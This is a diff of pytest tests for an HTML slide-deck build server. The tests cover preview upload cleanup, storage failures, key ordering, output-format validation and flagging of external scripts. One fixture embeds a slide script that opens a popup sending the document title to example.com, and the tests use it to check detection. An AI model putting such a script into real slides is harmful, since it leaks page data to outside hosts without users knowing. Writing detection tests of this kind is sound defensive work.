@@ -347,6 +347,7 @@ def test_run_python_html_non_build_change_does_nothing(server, storage, monkeypa
 
 def test_run_python_html_record_failure_reports_stale_html(server, storage, monkeypatch):
     _no_pptx(monkeypatch)
+    _fake_check(monkeypatch)  # the check writes PNGs, which must go with the previews
     _sandbox(monkeypatch, ["deck.css"])
     monkeypatch.setattr(storage, "update_deck", MagicMock(side_effect=RuntimeError("DynamoDB down")))
 
@@ -354,6 +355,68 @@ def test_run_python_html_record_failure_reports_stale_html(server, storage, monk
 
     assert "stale" in out["html_error"]
     assert storage.html_keys() == []  # the orphaned upload was deleted
+    assert storage.preview_keys() == []  # so were this run's previews and PNGs
+    assert not any(k.startswith("html/d1/png/") for k in storage.objects)
+
+
+def test_run_python_html_single_preview_upload_failure_publishes_nothing(server, storage, monkeypatch):
+    _no_pptx(monkeypatch)
+    storage.record["htmlS3Key"] = "html/d1/old.html"
+    storage.objects["html/d1/old.html"] = b"old"
+    upload = storage.upload_file
+
+    def flaky(key, data, content_type="", tagging=""):
+        if "/preview/body_" in key:
+            raise RuntimeError("S3 down")
+        upload(key, data, content_type, tagging)
+
+    monkeypatch.setattr(storage, "upload_file", flaky)
+    _sandbox(monkeypatch, ["deck.css"])
+
+    out = _run(server)
+
+    assert "body" in out["html_error"] and "stale" in out["html_error"]
+    assert not {"html", "previews", "png_previews"} & set(out)
+    assert storage.record["htmlS3Key"] == "html/d1/old.html" and storage.html_keys() == []
+    assert storage.preview_keys() == []
+
+
+def test_run_python_html_same_clock_writes_get_new_keys(server, storage, monkeypatch):
+    _no_pptx(monkeypatch)
+    monkeypatch.setattr(html_deck.time, "time_ns", lambda: 1_800_000_000_000 * 1_000_000)
+    _sandbox(monkeypatch, ["slides/cover.html"])
+
+    first = _run(server)["previews"]["cover"]
+    second = _run(server)["previews"]["cover"]
+
+    assert int(_PREVIEW_KEY.match(second).group(2)) > int(_PREVIEW_KEY.match(first).group(2))
+    assert first in storage.deleted and first not in storage.objects
+
+
+def test_run_python_html_revision_beats_older_second_epochs(server, storage, monkeypatch):
+    from shared.html_artifacts import build_html_preview_key_map
+
+    _no_pptx(monkeypatch)
+    old = "html/d1/preview/cover_1793374283.html"
+    storage.objects[old] = b"x"
+    _sandbox(monkeypatch, ["slides/cover.html"])
+
+    out = _run(server)
+
+    assert build_html_preview_key_map([old, out["previews"]["cover"]])["cover"] == out["previews"]["cover"]
+
+
+def test_run_python_html_unresolved_template_says_how_to_fix(server, storage, monkeypatch):
+    _no_pptx(monkeypatch)
+    deck_json = storage.get_deck_json("d1")
+    deck_json["template"] = "none"
+    storage.put_deck_json("d1", deck_json)
+    _sandbox(monkeypatch, ["slides/cover.html"])
+
+    out = _run(server)
+
+    assert "'none'" in out["html_error"] and "apply_style" in out["html_error"], out
+    assert storage.html_keys() == [] and storage.preview_keys() == []
 
 
 def test_js_deck_reports_the_skipped_browser_check(server, storage, tmp_path, monkeypatch):
@@ -571,6 +634,38 @@ def test_generate_pptx_finalizes_html_deck(server, storage, monkeypatch):
     assert not any(k.startswith("pptx/") for k in storage.objects)
 
 
+_NAV_BODY = ('<section data-layout="Title Only"><h1 data-ph="title">Claim</h1>'
+             '<script>window.open("https://example.com/?d=" + document.title);</script></section>')
+
+
+def test_run_python_html_records_script_external_and_a_clean_rebuild_removes_it(server, storage, monkeypatch):
+    _no_pptx(monkeypatch)
+    _sandbox(monkeypatch, ["slides/body.html"])
+    storage.objects["decks/d1/slides/body.html"] = _NAV_BODY.encode()
+
+    out = _run(server)
+
+    assert "html_error" not in out, out
+    assert storage.record["htmlScriptExternal"] == [{"slug": "body", "kinds": ["popup", "external-url"]}]
+    assert "script_external" not in out  # the record's data; the warnings tell the agent
+
+    storage.objects["decks/d1/slides/body.html"] = SLIDES["body"].encode()
+    assert "html_error" not in _run(server)
+    assert "htmlScriptExternal" not in storage.record
+    assert storage.updates[-1]["htmlScriptExternal"] is None
+
+
+def test_generate_pptx_records_script_external(server, storage):
+    storage.objects["decks/d1/slides/body.html"] = _NAV_BODY.encode()
+    result = json.loads(server.generate_pptx(deck_id="d1"))
+    assert result["status"] == "completed"
+    assert storage.record["htmlScriptExternal"] == [{"slug": "body", "kinds": ["popup", "external-url"]}]
+
+    storage.objects["decks/d1/slides/body.html"] = SLIDES["body"].encode()
+    json.loads(server.generate_pptx(deck_id="d1"))
+    assert "htmlScriptExternal" not in storage.record
+
+
 def test_generate_pptx_kb_failure_is_a_warning(server, storage, monkeypatch):
     kb = MagicMock()
     kb.sync_deck.side_effect = RuntimeError("vectors down")
@@ -598,6 +693,20 @@ def test_generate_pptx_partial_preview_upload_removes_this_runs_previews(server,
     assert storage.html_keys() == [] and "htmlS3Key" not in storage.record
 
 
+def test_generate_pptx_record_failure_removes_this_runs_previews(server, storage, monkeypatch):
+    previous = ["html/d1/preview/cover_1.html", "html/d1/preview/body_1.html"]
+    storage.objects.update({k: b"x" for k in previous})
+    storage.record["htmlS3Key"] = "html/d1/old.html"
+    storage.objects["html/d1/old.html"] = b"old"
+    monkeypatch.setattr(storage, "update_deck", MagicMock(side_effect=RuntimeError("DynamoDB down")))
+
+    result = json.loads(server.generate_pptx(deck_id="d1"))
+
+    assert "DynamoDB down" in result["error"]
+    assert storage.preview_keys() == sorted(previous)  # the older set stays the latest
+    assert storage.html_keys() == [] and storage.record["htmlS3Key"] == "html/d1/old.html"
+
+
 def test_generate_pptx_pptx_deck_takes_the_pptx_path(server, storage, monkeypatch):
     deck_json = storage.get_deck_json("d1")
     deck_json.pop("outputFormat")
@@ -606,6 +715,42 @@ def test_generate_pptx_pptx_deck_takes_the_pptx_path(server, storage, monkeypatc
     monkeypatch.setattr(remote_server.generate, "generate_pptx", lambda **kw: called.update(kw) or {"slideCount": 0})
     json.loads(server.generate_pptx(deck_id="d1"))
     assert called["deck_id"] == "d1"
+
+
+def _misspell_output_format(storage):
+    deck_json = storage.get_deck_json("d1")
+    deck_json["outputFormat"] = "htlm"
+    storage.put_deck_json("d1", deck_json)
+
+
+def test_run_python_invalid_output_format_stops_the_build(server, storage, monkeypatch):
+    _misspell_output_format(storage)
+    _no_pptx(monkeypatch)
+    _sandbox(monkeypatch, ["slides/cover.html"])
+    out = _run(server)
+    assert "htlm" in out["errors"]["outputFormat"]
+    assert storage.html_keys() == []
+
+
+def test_generate_pptx_invalid_output_format_returns_error(server, storage, monkeypatch):
+    _misspell_output_format(storage)
+    called = []
+    monkeypatch.setattr(remote_server.generate, "generate_pptx", lambda **kw: called.append(kw))
+    result = json.loads(server.generate_pptx(deck_id="d1"))
+    assert "outputFormat" in result["error"]
+    assert called == []
+
+
+def test_get_preview_invalid_output_format_returns_error(server, storage):
+    _misspell_output_format(storage)
+    [item] = server.get_preview(deck_id="d1", slugs=["cover"])
+    assert item["type"] == "text" and "outputFormat" in item["text"]
+
+
+@pytest.mark.parametrize("payload", [[], "deck", 3])
+def test_deck_format_treats_a_non_object_deck_json_as_pptx(server, storage, monkeypatch, payload):
+    monkeypatch.setattr(storage, "get_deck_json", lambda deck_id: payload)
+    assert remote_server._deck_format("d1") == "pptx"
 
 
 # --- get_preview ---------------------------------------------------------------
